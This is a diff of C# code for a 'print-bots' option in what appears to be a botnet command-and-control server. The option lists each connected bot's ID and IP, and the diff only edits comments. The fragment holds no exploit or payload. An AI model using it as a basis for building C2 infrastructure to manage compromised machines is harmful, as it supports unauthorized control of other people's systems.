@@ -16,7 +16,7 @@ namespace CnC_Server.Options
         }
 
         /// <summary>
-        /// Runs the print bots option
+        /// Runs the print-bots option
         /// </summary>
         public void Run()
         {
@@ -26,6 +26,7 @@ namespace CnC_Server.Options
                 return;
             }
 
+            // Go through each bot and print his ID and IP
             for(int i = 0;i<Bots.Count;i++)
             {
                 Console.WriteLine("Bot ID: {0}  Bot IP: {1}\n", i + 1, Bots[i].ip);
@@ -33,7 +34,7 @@ namespace CnC_Server.Options
         }
 
         /// <summary>
-        /// Describe what the "print bots" option does
+        /// Describe what the "print-bots" option does
         /// </summary>
         public void PrintDescription()
         {
@@ -41,8 +42,9 @@ namespace CnC_Server.Options
         }
 
         /// <summary>
-        /// No arguments to the "print bots" option and therefore return true always
+        /// No arguments to the "print-bots" option and therefore return true always
         /// </summary>
+        /// <returns>True always</returns>
         public bool ParseArguments(string[] arguments)
         {
             return true;
